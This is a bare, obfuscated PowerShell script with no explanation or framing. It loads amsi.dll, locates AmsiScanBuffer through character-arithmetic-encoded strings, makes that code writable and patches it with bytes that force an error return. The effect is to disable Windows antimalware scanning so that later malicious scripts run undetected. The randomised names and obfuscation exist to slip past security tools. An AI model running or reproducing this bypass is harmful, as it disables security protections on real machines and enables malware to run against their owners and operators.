$gpLPKlKanNls = @"
using System;
using System.Runtime.InteropServices;
public class gpLPKlKanNls {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr eteKYI, string UqlfYAHB7h9HbVyd52JK);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr iGOXvN1RdVL, UIntPtr bhIX88iEwheqE, uint BhMYM21l52QJOcqKjSB, out uint ZPcRvf);
}
"@

Add-Type $gpLPKlKanNls

$_8Ym9y2yJje = [gpLPKlKanNls]::LoadLibrary("$(('âmsí.d'+'ll').noRMAlIze([cHAR]([byTE]0x46)+[CHaR](111*98/98)+[CHaR](53+61)+[CHaR](109)+[ChAr](68)) -replace [CHAr]([BYTE]0x5c)+[CHaR]([bYtE]0x70)+[Char](123+57-57)+[Char](77*10/10)+[cHAr]([BytE]0x6e)+[char](125+53-53))")
$XUHFWZi4Z = [gpLPKlKanNls]::GetProcAddress($_8Ym9y2yJje, "$([cHaR](65)+[char]([ByTE]0x6d)+[CHAR]([BytE]0x73)+[char](105+4-4)+[char](83+21-21)+[Char](99+2-2)+[cHaR]([ByTE]0x61)+[ChaR](110*97/97)+[chAR](66+36-36)+[ChAr]([bYTe]0x75)+[chAR]([ByTE]0x66)+[CHAr](102+29-29)+[ChAr]([Byte]0x65)+[cHAR](114*88/88))")
$p = 0
[gpLPKlKanNls]::VirtualProtect($XUHFWZi4Z, [uint32]5, 0x40, [ref]$p)
$f4_SJ34U2ZPsT1yQ6jA = "0xB8"
$GUkvLNlIDVb3v_ = "0x57"
$vyBwRAhiWwJO4ToCr = "0x00"
$Yd_FspwzkHHLaDEV = "0x07"
$rUle2ayCsI = "0x80"
$WwOevPfzojr_Z8iu17HY = "0xC3"
$gc3yT2iJy = [Byte[]] ($f4_SJ34U2ZPsT1yQ6jA,$GUkvLNlIDVb3v_,$vyBwRAhiWwJO4ToCr,$Yd_FspwzkHHLaDEV,+$rUle2ayCsI,+$WwOevPfzojr_Z8iu17HY)
[System.Runtime.InteropServices.Marshal]::Copy($gc3yT2iJy, 0, $XUHFWZi4Z, 6)